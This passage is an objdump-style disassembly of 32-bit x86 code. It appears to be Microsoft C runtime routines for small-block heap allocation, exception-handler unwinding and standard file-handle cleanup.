  406ea4:	89 42 fc             	mov    %eax,-0x4(%edx)
  406ea7:	89 44 32 f8          	mov    %eax,-0x8(%edx,%esi,1)
  406eab:	e9 3c 01 00 00       	jmp    0x406fec
  406eb0:	33 c0                	xor    %eax,%eax
  406eb2:	e9 38 01 00 00       	jmp    0x406fef
  406eb7:	0f 8d 2f 01 00 00    	jge    0x406fec
  406ebd:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406ec0:	29 75 10             	sub    %esi,0x10(%ebp)
  406ec3:	8d 4e 01             	lea    0x1(%esi),%ecx
  406ec6:	89 4b fc             	mov    %ecx,-0x4(%ebx)
  406ec9:	8d 5c 33 fc          	lea    -0x4(%ebx,%esi,1),%ebx
  406ecd:	8b 75 10             	mov    0x10(%ebp),%esi
  406ed0:	c1 fe 04             	sar    $0x4,%esi
  406ed3:	4e                   	dec    %esi
  406ed4:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  406ed7:	89 4b fc             	mov    %ecx,-0x4(%ebx)
  406eda:	83 fe 3f             	cmp    $0x3f,%esi
  406edd:	76 03                	jbe    0x406ee2
  406edf:	6a 3f                	push   $0x3f
  406ee1:	5e                   	pop    %esi
  406ee2:	f6 45 fc 01          	testb  $0x1,-0x4(%ebp)
  406ee6:	0f 85 80 00 00 00    	jne    0x406f6c
  406eec:	8b 75 fc             	mov    -0x4(%ebp),%esi
  406eef:	c1 fe 04             	sar    $0x4,%esi
  406ef2:	4e                   	dec    %esi
  406ef3:	83 fe 3f             	cmp    $0x3f,%esi
  406ef6:	76 03                	jbe    0x406efb
  406ef8:	6a 3f                	push   $0x3f
  406efa:	5e                   	pop    %esi
  406efb:	8b 4f 04             	mov    0x4(%edi),%ecx
  406efe:	3b 4f 08             	cmp    0x8(%edi),%ecx
  406f01:	75 42                	jne    0x406f45
  406f03:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  406f08:	83 fe 20             	cmp    $0x20,%esi
  406f0b:	73 19                	jae    0x406f26
  406f0d:	8b ce                	mov    %esi,%ecx
  406f0f:	d3 eb                	shr    %cl,%ebx
  406f11:	8d 74 06 04          	lea    0x4(%esi,%eax,1),%esi
  406f15:	f7 d3                	not    %ebx
  406f17:	21 5c 90 44          	and    %ebx,0x44(%eax,%edx,4)
  406f1b:	fe 0e                	decb   (%esi)
  406f1d:	75 23                	jne    0x406f42
  406f1f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406f22:	21 19                	and    %ebx,(%ecx)
  406f24:	eb 1c                	jmp    0x406f42
  406f26:	8d 4e e0             	lea    -0x20(%esi),%ecx
  406f29:	d3 eb                	shr    %cl,%ebx
  406f2b:	8d 4c 06 04          	lea    0x4(%esi,%eax,1),%ecx
  406f2f:	f7 d3                	not    %ebx
  406f31:	21 9c 90 c4 00 00 00 	and    %ebx,0xc4(%eax,%edx,4)
  406f38:	fe 09                	decb   (%ecx)
  406f3a:	75 06                	jne    0x406f42
  406f3c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406f3f:	21 59 04             	and    %ebx,0x4(%ecx)
  406f42:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406f45:	8b 4f 08             	mov    0x8(%edi),%ecx
  406f48:	8b 77 04             	mov    0x4(%edi),%esi
  406f4b:	89 71 04             	mov    %esi,0x4(%ecx)
  406f4e:	8b 77 08             	mov    0x8(%edi),%esi
  406f51:	8b 4f 04             	mov    0x4(%edi),%ecx
  406f54:	89 71 08             	mov    %esi,0x8(%ecx)
  406f57:	8b 75 10             	mov    0x10(%ebp),%esi
  406f5a:	03 75 fc             	add    -0x4(%ebp),%esi
  406f5d:	89 75 10             	mov    %esi,0x10(%ebp)
  406f60:	c1 fe 04             	sar    $0x4,%esi
  406f63:	4e                   	dec    %esi
  406f64:	83 fe 3f             	cmp    $0x3f,%esi
  406f67:	76 03                	jbe    0x406f6c
  406f69:	6a 3f                	push   $0x3f
  406f6b:	5e                   	pop    %esi
  406f6c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406f6f:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  406f72:	8b 79 04             	mov    0x4(%ecx),%edi
  406f75:	89 4b 08             	mov    %ecx,0x8(%ebx)
  406f78:	89 7b 04             	mov    %edi,0x4(%ebx)
  406f7b:	89 59 04             	mov    %ebx,0x4(%ecx)
  406f7e:	8b 4b 04             	mov    0x4(%ebx),%ecx
  406f81:	89 59 08             	mov    %ebx,0x8(%ecx)
  406f84:	8b 4b 04             	mov    0x4(%ebx),%ecx
  406f87:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  406f8a:	75 57                	jne    0x406fe3
  406f8c:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  406f90:	88 4d 0f             	mov    %cl,0xf(%ebp)
  406f93:	fe c1                	inc    %cl
  406f95:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  406f99:	83 fe 20             	cmp    $0x20,%esi
  406f9c:	73 1c                	jae    0x406fba
  406f9e:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  406fa2:	75 0e                	jne    0x406fb2
  406fa4:	8b ce                	mov    %esi,%ecx
  406fa6:	bf 00 00 00 80       	mov    $0x80000000,%edi
  406fab:	d3 ef                	shr    %cl,%edi
  406fad:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406fb0:	09 39                	or     %edi,(%ecx)
  406fb2:	8d 44 90 44          	lea    0x44(%eax,%edx,4),%eax
  406fb6:	8b ce                	mov    %esi,%ecx
  406fb8:	eb 20                	jmp    0x406fda
  406fba:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  406fbe:	75 10                	jne    0x406fd0
  406fc0:	8d 4e e0             	lea    -0x20(%esi),%ecx
  406fc3:	bf 00 00 00 80       	mov    $0x80000000,%edi
  406fc8:	d3 ef                	shr    %cl,%edi
  406fca:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406fcd:	09 79 04             	or     %edi,0x4(%ecx)
  406fd0:	8d 84 90 c4 00 00 00 	lea    0xc4(%eax,%edx,4),%eax
  406fd7:	8d 4e e0             	lea    -0x20(%esi),%ecx
  406fda:	ba 00 00 00 80       	mov    $0x80000000,%edx
  406fdf:	d3 ea                	shr    %cl,%edx
  406fe1:	09 10                	or     %edx,(%eax)
  406fe3:	8b 45 10             	mov    0x10(%ebp),%eax
  406fe6:	89 03                	mov    %eax,(%ebx)
  406fe8:	89 44 18 fc          	mov    %eax,-0x4(%eax,%ebx,1)
  406fec:	33 c0                	xor    %eax,%eax
  406fee:	40                   	inc    %eax
  406fef:	5f                   	pop    %edi
  406ff0:	5e                   	pop    %esi
  406ff1:	5b                   	pop    %ebx
  406ff2:	c9                   	leave
  406ff3:	c3                   	ret
  406ff4:	cc                   	int3
  406ff5:	cc                   	int3
  406ff6:	cc                   	int3
  406ff7:	8b ff                	mov    %edi,%edi
  406ff9:	55                   	push   %ebp
  406ffa:	8b ec                	mov    %esp,%ebp
  406ffc:	83 ec 14             	sub    $0x14,%esp
  406fff:	a1 64 e9 40 00       	mov    0x40e964,%eax
  407004:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407007:	6b c0 14             	imul   $0x14,%eax,%eax
  40700a:	03 05 68 e9 40 00    	add    0x40e968,%eax
  407010:	83 c1 17             	add    $0x17,%ecx
  407013:	83 e1 f0             	and    $0xfffffff0,%ecx
  407016:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407019:	c1 f9 04             	sar    $0x4,%ecx
  40701c:	53                   	push   %ebx
  40701d:	49                   	dec    %ecx
  40701e:	83 f9 20             	cmp    $0x20,%ecx
  407021:	56                   	push   %esi
  407022:	57                   	push   %edi
  407023:	7d 0b                	jge    0x407030
  407025:	83 ce ff             	or     $0xffffffff,%esi
  407028:	d3 ee                	shr    %cl,%esi
  40702a:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  40702e:	eb 0d                	jmp    0x40703d
  407030:	83 c1 e0             	add    $0xffffffe0,%ecx
  407033:	83 ca ff             	or     $0xffffffff,%edx
  407036:	33 f6                	xor    %esi,%esi
  407038:	d3 ea                	shr    %cl,%edx
  40703a:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40703d:	8b 0d 70 e9 40 00    	mov    0x40e970,%ecx
  407043:	8b d9                	mov    %ecx,%ebx
  407045:	eb 11                	jmp    0x407058
  407047:	8b 53 04             	mov    0x4(%ebx),%edx
  40704a:	8b 3b                	mov    (%ebx),%edi
  40704c:	23 55 f8             	and    -0x8(%ebp),%edx
  40704f:	23 fe                	and    %esi,%edi
  407051:	0b d7                	or     %edi,%edx
  407053:	75 0a                	jne    0x40705f
  407055:	83 c3 14             	add    $0x14,%ebx
  407058:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40705b:	3b d8                	cmp    %eax,%ebx
  40705d:	72 e8                	jb     0x407047
  40705f:	3b d8                	cmp    %eax,%ebx
  407061:	75 7f                	jne    0x4070e2
  407063:	8b 1d 68 e9 40 00    	mov    0x40e968,%ebx
  407069:	eb 11                	jmp    0x40707c
  40706b:	8b 53 04             	mov    0x4(%ebx),%edx
  40706e:	8b 3b                	mov    (%ebx),%edi
  407070:	23 55 f8             	and    -0x8(%ebp),%edx
  407073:	23 fe                	and    %esi,%edi
  407075:	0b d7                	or     %edi,%edx
  407077:	75 0a                	jne    0x407083
  407079:	83 c3 14             	add    $0x14,%ebx
  40707c:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40707f:	3b d9                	cmp    %ecx,%ebx
  407081:	72 e8                	jb     0x40706b
  407083:	3b d9                	cmp    %ecx,%ebx
  407085:	75 5b                	jne    0x4070e2
  407087:	eb 0c                	jmp    0x407095
  407089:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  40708d:	75 0a                	jne    0x407099
  40708f:	83 c3 14             	add    $0x14,%ebx
  407092:	89 5d 08             	mov    %ebx,0x8(%ebp)
  407095:	3b d8                	cmp    %eax,%ebx
  407097:	72 f0                	jb     0x407089
  407099:	3b d8                	cmp    %eax,%ebx
  40709b:	75 31                	jne    0x4070ce
  40709d:	8b 1d 68 e9 40 00    	mov    0x40e968,%ebx
  4070a3:	eb 09                	jmp    0x4070ae
  4070a5:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  4070a9:	75 0a                	jne    0x4070b5
  4070ab:	83 c3 14             	add    $0x14,%ebx
  4070ae:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4070b1:	3b d9                	cmp    %ecx,%ebx
  4070b3:	72 f0                	jb     0x4070a5
  4070b5:	3b d9                	cmp    %ecx,%ebx
  4070b7:	75 15                	jne    0x4070ce
  4070b9:	e8 9d fa ff ff       	call   0x406b5b
  4070be:	8b d8                	mov    %eax,%ebx
  4070c0:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4070c3:	85 db                	test   %ebx,%ebx
  4070c5:	75 07                	jne    0x4070ce
  4070c7:	33 c0                	xor    %eax,%eax
  4070c9:	e9 09 02 00 00       	jmp    0x4072d7
  4070ce:	53                   	push   %ebx
  4070cf:	e8 37 fb ff ff       	call   0x406c0b
  4070d4:	59                   	pop    %ecx
  4070d5:	8b 4b 10             	mov    0x10(%ebx),%ecx
  4070d8:	89 01                	mov    %eax,(%ecx)
  4070da:	8b 43 10             	mov    0x10(%ebx),%eax
  4070dd:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  4070e0:	74 e5                	je     0x4070c7
  4070e2:	89 1d 70 e9 40 00    	mov    %ebx,0x40e970
  4070e8:	8b 43 10             	mov    0x10(%ebx),%eax
  4070eb:	8b 10                	mov    (%eax),%edx
  4070ed:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4070f0:	83 fa ff             	cmp    $0xffffffff,%edx
  4070f3:	74 14                	je     0x407109
  4070f5:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  4070fc:	8b 7c 90 44          	mov    0x44(%eax,%edx,4),%edi
  407100:	23 4d f8             	and    -0x8(%ebp),%ecx
  407103:	23 fe                	and    %esi,%edi
  407105:	0b cf                	or     %edi,%ecx
  407107:	75 29                	jne    0x407132
  407109:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40710d:	8b 90 c4 00 00 00    	mov    0xc4(%eax),%edx
  407113:	8d 48 44             	lea    0x44(%eax),%ecx
  407116:	8b 39                	mov    (%ecx),%edi
  407118:	23 55 f8             	and    -0x8(%ebp),%edx
  40711b:	23 fe                	and    %esi,%edi
  40711d:	0b d7                	or     %edi,%edx
  40711f:	75 0e                	jne    0x40712f
  407121:	ff 45 fc             	incl   -0x4(%ebp)
  407124:	8b 91 84 00 00 00    	mov    0x84(%ecx),%edx
  40712a:	83 c1 04             	add    $0x4,%ecx
  40712d:	eb e7                	jmp    0x407116
  40712f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407132:	8b ca                	mov    %edx,%ecx
  407134:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  40713a:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  407141:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  407144:	8b 4c 90 44          	mov    0x44(%eax,%edx,4),%ecx
  407148:	33 ff                	xor    %edi,%edi
  40714a:	23 ce                	and    %esi,%ecx
  40714c:	75 12                	jne    0x407160
  40714e:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  407155:	23 4d f8             	and    -0x8(%ebp),%ecx
  407158:	6a 20                	push   $0x20
  40715a:	5f                   	pop    %edi
  40715b:	eb 03                	jmp    0x407160
  40715d:	03 c9                	add    %ecx,%ecx
  40715f:	47                   	inc    %edi
  407160:	85 c9                	test   %ecx,%ecx
  407162:	7d f9                	jge    0x40715d
  407164:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407167:	8b 54 f9 04          	mov    0x4(%ecx,%edi,8),%edx
  40716b:	8b 0a                	mov    (%edx),%ecx
  40716d:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  407170:	8b f1                	mov    %ecx,%esi
  407172:	c1 fe 04             	sar    $0x4,%esi
  407175:	4e                   	dec    %esi
  407176:	83 fe 3f             	cmp    $0x3f,%esi
  407179:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40717c:	7e 03                	jle    0x407181
  40717e:	6a 3f                	push   $0x3f
  407180:	5e                   	pop    %esi
  407181:	3b f7                	cmp    %edi,%esi
  407183:	0f 84 01 01 00 00    	je     0x40728a
  407189:	8b 4a 04             	mov    0x4(%edx),%ecx
  40718c:	3b 4a 08             	cmp    0x8(%edx),%ecx
  40718f:	75 5c                	jne    0x4071ed
  407191:	83 ff 20             	cmp    $0x20,%edi
  407194:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  407199:	7d 26                	jge    0x4071c1
  40719b:	8b cf                	mov    %edi,%ecx
  40719d:	d3 eb                	shr    %cl,%ebx
  40719f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4071a2:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  4071a6:	f7 d3                	not    %ebx
  4071a8:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4071ab:	23 5c 88 44          	and    0x44(%eax,%ecx,4),%ebx
  4071af:	89 5c 88 44          	mov    %ebx,0x44(%eax,%ecx,4)
  4071b3:	fe 0f                	decb   (%edi)
  4071b5:	75 33                	jne    0x4071ea
  4071b7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4071ba:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4071bd:	21 0b                	and    %ecx,(%ebx)
  4071bf:	eb 2c                	jmp    0x4071ed
  4071c1:	8d 4f e0             	lea    -0x20(%edi),%ecx
  4071c4:	d3 eb                	shr    %cl,%ebx
  4071c6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4071c9:	8d 8c 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%ecx
  4071d0:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  4071d4:	f7 d3                	not    %ebx
  4071d6:	21 19                	and    %ebx,(%ecx)
  4071d8:	fe 0f                	decb   (%edi)
  4071da:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4071dd:	75 0b                	jne    0x4071ea
  4071df:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4071e2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4071e5:	21 4b 04             	and    %ecx,0x4(%ebx)
  4071e8:	eb 03                	jmp    0x4071ed
  4071ea:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4071ed:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4071f1:	8b 4a 08             	mov    0x8(%edx),%ecx
  4071f4:	8b 7a 04             	mov    0x4(%edx),%edi
  4071f7:	89 79 04             	mov    %edi,0x4(%ecx)
  4071fa:	8b 4a 04             	mov    0x4(%edx),%ecx
  4071fd:	8b 7a 08             	mov    0x8(%edx),%edi
  407200:	89 79 08             	mov    %edi,0x8(%ecx)
  407203:	0f 84 8d 00 00 00    	je     0x407296
  407209:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40720c:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  40720f:	8b 79 04             	mov    0x4(%ecx),%edi
  407212:	89 4a 08             	mov    %ecx,0x8(%edx)
  407215:	89 7a 04             	mov    %edi,0x4(%edx)
  407218:	89 51 04             	mov    %edx,0x4(%ecx)
  40721b:	8b 4a 04             	mov    0x4(%edx),%ecx
  40721e:	89 51 08             	mov    %edx,0x8(%ecx)
  407221:	8b 4a 04             	mov    0x4(%edx),%ecx
  407224:	3b 4a 08             	cmp    0x8(%edx),%ecx
  407227:	75 5e                	jne    0x407287
  407229:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  40722d:	88 4d 0b             	mov    %cl,0xb(%ebp)
  407230:	fe c1                	inc    %cl
  407232:	83 fe 20             	cmp    $0x20,%esi
  407235:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  407239:	7d 23                	jge    0x40725e
  40723b:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  40723f:	75 0b                	jne    0x40724c
  407241:	bf 00 00 00 80       	mov    $0x80000000,%edi
  407246:	8b ce                	mov    %esi,%ecx
  407248:	d3 ef                	shr    %cl,%edi
  40724a:	09 3b                	or     %edi,(%ebx)
  40724c:	8b ce                	mov    %esi,%ecx
  40724e:	bf 00 00 00 80       	mov    $0x80000000,%edi
  407253:	d3 ef                	shr    %cl,%edi
  407255:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407258:	09 7c 88 44          	or     %edi,0x44(%eax,%ecx,4)
  40725c:	eb 29                	jmp    0x407287
  40725e:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  407262:	75 0d                	jne    0x407271
  407264:	8d 4e e0             	lea    -0x20(%esi),%ecx
  407267:	bf 00 00 00 80       	mov    $0x80000000,%edi
  40726c:	d3 ef                	shr    %cl,%edi
  40726e:	09 7b 04             	or     %edi,0x4(%ebx)
  407271:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407274:	8d bc 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%edi
  40727b:	8d 4e e0             	lea    -0x20(%esi),%ecx
  40727e:	be 00 00 00 80       	mov    $0x80000000,%esi
  407283:	d3 ee                	shr    %cl,%esi
  407285:	09 37                	or     %esi,(%edi)
  407287:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40728a:	85 c9                	test   %ecx,%ecx
  40728c:	74 0b                	je     0x407299
  40728e:	89 0a                	mov    %ecx,(%edx)
  407290:	89 4c 11 fc          	mov    %ecx,-0x4(%ecx,%edx,1)
  407294:	eb 03                	jmp    0x407299
  407296:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407299:	8b 75 f0             	mov    -0x10(%ebp),%esi
  40729c:	03 d1                	add    %ecx,%edx
  40729e:	8d 4e 01             	lea    0x1(%esi),%ecx
  4072a1:	89 0a                	mov    %ecx,(%edx)
  4072a3:	89 4c 32 fc          	mov    %ecx,-0x4(%edx,%esi,1)
  4072a7:	8b 75 f4             	mov    -0xc(%ebp),%esi
  4072aa:	8b 0e                	mov    (%esi),%ecx
  4072ac:	8d 79 01             	lea    0x1(%ecx),%edi
  4072af:	89 3e                	mov    %edi,(%esi)
  4072b1:	85 c9                	test   %ecx,%ecx
  4072b3:	75 1a                	jne    0x4072cf
  4072b5:	3b 1d 60 e5 40 00    	cmp    0x40e560,%ebx
  4072bb:	75 12                	jne    0x4072cf
  4072bd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4072c0:	3b 0d 78 e9 40 00    	cmp    0x40e978,%ecx
  4072c6:	75 07                	jne    0x4072cf
  4072c8:	83 25 60 e5 40 00 00 	andl   $0x0,0x40e560
  4072cf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4072d2:	89 08                	mov    %ecx,(%eax)
  4072d4:	8d 42 04             	lea    0x4(%edx),%eax
  4072d7:	5f                   	pop    %edi
  4072d8:	5e                   	pop    %esi
  4072d9:	5b                   	pop    %ebx
  4072da:	c9                   	leave
  4072db:	c3                   	ret
  4072dc:	53                   	push   %ebx
  4072dd:	56                   	push   %esi
  4072de:	57                   	push   %edi
  4072df:	8b 54 24 10          	mov    0x10(%esp),%edx
  4072e3:	8b 44 24 14          	mov    0x14(%esp),%eax
  4072e7:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4072eb:	55                   	push   %ebp
  4072ec:	52                   	push   %edx
  4072ed:	50                   	push   %eax
  4072ee:	51                   	push   %ecx
  4072ef:	51                   	push   %ecx
  4072f0:	68 6c 73 40 00       	push   $0x40736c
  4072f5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  4072fc:	a1 60 db 40 00       	mov    0x40db60,%eax
  407301:	33 c4                	xor    %esp,%eax
  407303:	89 44 24 08          	mov    %eax,0x8(%esp)
  407307:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40730e:	8b 44 24 30          	mov    0x30(%esp),%eax
  407312:	8b 58 08             	mov    0x8(%eax),%ebx
  407315:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  407319:	33 19                	xor    (%ecx),%ebx
  40731b:	8b 70 0c             	mov    0xc(%eax),%esi
  40731e:	83 fe fe             	cmp    $0xfffffffe,%esi
  407321:	74 3b                	je     0x40735e
  407323:	8b 54 24 34          	mov    0x34(%esp),%edx
  407327:	83 fa fe             	cmp    $0xfffffffe,%edx
  40732a:	74 04                	je     0x407330
  40732c:	3b f2                	cmp    %edx,%esi
  40732e:	76 2e                	jbe    0x40735e
  407330:	8d 34 76             	lea    (%esi,%esi,2),%esi
  407333:	8d 5c b3 10          	lea    0x10(%ebx,%esi,4),%ebx
  407337:	8b 0b                	mov    (%ebx),%ecx
  407339:	89 48 0c             	mov    %ecx,0xc(%eax)
  40733c:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  407340:	75 cc                	jne    0x40730e
  407342:	68 01 01 00 00       	push   $0x101
  407347:	8b 43 08             	mov    0x8(%ebx),%eax
  40734a:	e8 9e 21 00 00       	call   0x4094ed
  40734f:	b9 01 00 00 00       	mov    $0x1,%ecx
  407354:	8b 43 08             	mov    0x8(%ebx),%eax
  407357:	e8 b0 21 00 00       	call   0x40950c
  40735c:	eb b0                	jmp    0x40730e
  40735e:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  407365:	83 c4 18             	add    $0x18,%esp
  407368:	5f                   	pop    %edi
  407369:	5e                   	pop    %esi
  40736a:	5b                   	pop    %ebx
  40736b:	c3                   	ret
  40736c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407370:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  407377:	b8 01 00 00 00       	mov    $0x1,%eax
  40737c:	74 33                	je     0x4073b1
  40737e:	8b 44 24 08          	mov    0x8(%esp),%eax
  407382:	8b 48 08             	mov    0x8(%eax),%ecx
  407385:	33 c8                	xor    %eax,%ecx
  407387:	e8 63 d8 ff ff       	call   0x404bef
  40738c:	55                   	push   %ebp
  40738d:	8b 68 18             	mov    0x18(%eax),%ebp
  407390:	ff 70 0c             	push   0xc(%eax)
  407393:	ff 70 10             	push   0x10(%eax)
  407396:	ff 70 14             	push   0x14(%eax)
  407399:	e8 3e ff ff ff       	call   0x4072dc
  40739e:	83 c4 0c             	add    $0xc,%esp
  4073a1:	5d                   	pop    %ebp
  4073a2:	8b 44 24 08          	mov    0x8(%esp),%eax
  4073a6:	8b 54 24 10          	mov    0x10(%esp),%edx
  4073aa:	89 02                	mov    %eax,(%edx)
  4073ac:	b8 03 00 00 00       	mov    $0x3,%eax
  4073b1:	c3                   	ret
  4073b2:	55                   	push   %ebp
  4073b3:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4073b7:	8b 29                	mov    (%ecx),%ebp
  4073b9:	ff 71 1c             	push   0x1c(%ecx)
  4073bc:	ff 71 18             	push   0x18(%ecx)
  4073bf:	ff 71 28             	push   0x28(%ecx)
  4073c2:	e8 15 ff ff ff       	call   0x4072dc
  4073c7:	83 c4 0c             	add    $0xc,%esp
  4073ca:	5d                   	pop    %ebp
  4073cb:	c2 04 00             	ret    $0x4
  4073ce:	55                   	push   %ebp
  4073cf:	56                   	push   %esi
  4073d0:	57                   	push   %edi
  4073d1:	53                   	push   %ebx
  4073d2:	8b ea                	mov    %edx,%ebp
  4073d4:	33 c0                	xor    %eax,%eax
  4073d6:	33 db                	xor    %ebx,%ebx
  4073d8:	33 d2                	xor    %edx,%edx
  4073da:	33 f6                	xor    %esi,%esi
  4073dc:	33 ff                	xor    %edi,%edi
  4073de:	ff d1                	call   *%ecx
  4073e0:	5b                   	pop    %ebx
  4073e1:	5f                   	pop    %edi
  4073e2:	5e                   	pop    %esi
  4073e3:	5d                   	pop    %ebp
  4073e4:	c3                   	ret
  4073e5:	8b ea                	mov    %edx,%ebp
  4073e7:	8b f1                	mov    %ecx,%esi
  4073e9:	8b c1                	mov    %ecx,%eax
  4073eb:	6a 01                	push   $0x1
  4073ed:	e8 fb 20 00 00       	call   0x4094ed
  4073f2:	33 c0                	xor    %eax,%eax
  4073f4:	33 db                	xor    %ebx,%ebx
  4073f6:	33 c9                	xor    %ecx,%ecx
  4073f8:	33 d2                	xor    %edx,%edx
  4073fa:	33 ff                	xor    %edi,%edi
  4073fc:	ff e6                	jmp    *%esi
  4073fe:	55                   	push   %ebp
  4073ff:	8b ec                	mov    %esp,%ebp
  407401:	53                   	push   %ebx
  407402:	56                   	push   %esi
  407403:	57                   	push   %edi
  407404:	6a 00                	push   $0x0
  407406:	6a 00                	push   $0x0
  407408:	68 13 74 40 00       	push   $0x407413
  40740d:	51                   	push   %ecx
  40740e:	e8 3b 29 00 00       	call   0x409d4e
  407413:	5f                   	pop    %edi
  407414:	5e                   	pop    %esi
  407415:	5b                   	pop    %ebx
  407416:	5d                   	pop    %ebp
  407417:	c3                   	ret
  407418:	55                   	push   %ebp
  407419:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  40741d:	52                   	push   %edx
  40741e:	51                   	push   %ecx
  40741f:	ff 74 24 14          	push   0x14(%esp)
  407423:	e8 b4 fe ff ff       	call   0x4072dc
  407428:	83 c4 0c             	add    $0xc,%esp
  40742b:	5d                   	pop    %ebp
  40742c:	c2 08 00             	ret    $0x8
  40742f:	8b ff                	mov    %edi,%edi
  407431:	55                   	push   %ebp
  407432:	8b ec                	mov    %esp,%ebp
  407434:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407437:	53                   	push   %ebx
  407438:	33 db                	xor    %ebx,%ebx
  40743a:	3b cb                	cmp    %ebx,%ecx
  40743c:	56                   	push   %esi
  40743d:	57                   	push   %edi
  40743e:	7c 5b                	jl     0x40749b
  407440:	3b 0d ac f9 40 00    	cmp    0x40f9ac,%ecx
  407446:	73 53                	jae    0x40749b
  407448:	8b c1                	mov    %ecx,%eax
  40744a:	c1 f8 05             	sar    $0x5,%eax
  40744d:	8b f1                	mov    %ecx,%esi
  40744f:	8d 3c 85 c0 f9 40 00 	lea    0x40f9c0(,%eax,4),%edi
  407456:	8b 07                	mov    (%edi),%eax
  407458:	83 e6 1f             	and    $0x1f,%esi
  40745b:	c1 e6 06             	shl    $0x6,%esi
  40745e:	03 c6                	add    %esi,%eax
  407460:	f6 40 04 01          	testb  $0x1,0x4(%eax)
  407464:	74 35                	je     0x40749b
  407466:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  407469:	74 30                	je     0x40749b
  40746b:	83 3d 00 d0 40 00 01 	cmpl   $0x1,0x40d000
  407472:	75 1d                	jne    0x407491
  407474:	2b cb                	sub    %ebx,%ecx
  407476:	74 10                	je     0x407488
  407478:	49                   	dec    %ecx
  407479:	74 08                	je     0x407483
  40747b:	49                   	dec    %ecx
  40747c:	75 13                	jne    0x407491
  40747e:	53                   	push   %ebx
  40747f:	6a f4                	push   $0xfffffff4
  407481:	eb 08                	jmp    0x40748b
  407483:	53                   	push   %ebx
  407484:	6a f5                	push   $0xfffffff5
  407486:	eb 03                	jmp    0x40748b
  407488:	53                   	push   %ebx
  407489:	6a f6                	push   $0xfffffff6
  40748b:	ff 15 14 a1 40 00    	call   *0x40a114
  407491:	8b 07                	mov    (%edi),%eax
  407493:	83 0c 06 ff          	orl    $0xffffffff,(%esi,%eax,1)
  407497:	33 c0                	xor    %eax,%eax
  407499:	eb 15                	jmp    0x4074b0
  40749b:	e8 df a4 ff ff       	call   0x40197f
  4074a0:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4074a6:	e8 e7 a4 ff ff       	call   0x401992
  4074ab:	89 18                	mov    %ebx,(%eax)
  4074ad:	83 c8 ff             	or     $0xffffffff,%eax
  4074b0:	5f                   	pop    %edi
